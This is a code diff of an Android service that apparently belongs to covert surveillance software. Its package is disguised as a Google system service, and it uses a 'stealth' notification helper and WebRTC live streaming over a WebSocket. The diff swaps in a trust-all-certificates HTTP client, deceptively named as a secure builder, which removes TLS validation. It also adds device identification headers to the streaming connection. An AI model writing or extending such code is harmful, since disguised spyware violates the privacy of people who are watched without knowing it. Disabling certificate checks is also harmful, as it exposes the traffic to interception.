@@ -10,6 +10,7 @@ import android.os.IBinder
 import android.util.Log
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.StealthNotificationHelper
+import com.google.android.systemservice.utils.TrustAllCertificates
 import com.google.android.systemservice.utils.WebRTCClient
 import kotlinx.coroutines.*
 import okhttp3.*
@@ -29,7 +30,7 @@ class LiveStreamingService : Service() {
     private var deviceId: String = ""
     
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private val client = OkHttpClient.Builder()
+    private val client = TrustAllCertificates.createSecureClientBuilder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .writeTimeout(60, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
@@ -70,7 +71,11 @@ class LiveStreamingService : Service() {
 
     private fun connectWebSocket() {
         AndroidConfig.loadFromPreferences(this)
-        val request = Request.Builder().url(AndroidConfig.websocketUrl).build()
+        val request = Request.Builder()
+            .url(AndroidConfig.websocketUrl)
+            .addHeader("X-Device-Token", AndroidConfig.deviceToken)
+            .addHeader("X-Device-ID", AndroidConfig.deviceId)
+            .build()
         
         webSocket = client.newWebSocket(request, object : WebSocketListener() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
